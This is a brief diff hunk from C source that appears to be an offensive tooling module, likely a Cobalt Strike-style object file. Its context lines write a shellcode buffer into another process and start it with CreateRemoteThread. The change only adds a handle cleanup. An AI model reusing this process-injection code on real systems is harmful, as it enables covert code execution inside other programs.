@@ -21,6 +21,6 @@ void go(char * argc, int len)
 		KERNEL32$WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
 		HANDLE Remote_Thread = KERNEL32$CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)Alloc, NULL, 0, NULL);
 	}
+	KERNEL32$CloseHandle(Remote_Thread);
 	KERNEL32$CloseHandle(Process_Handle);
-
 }
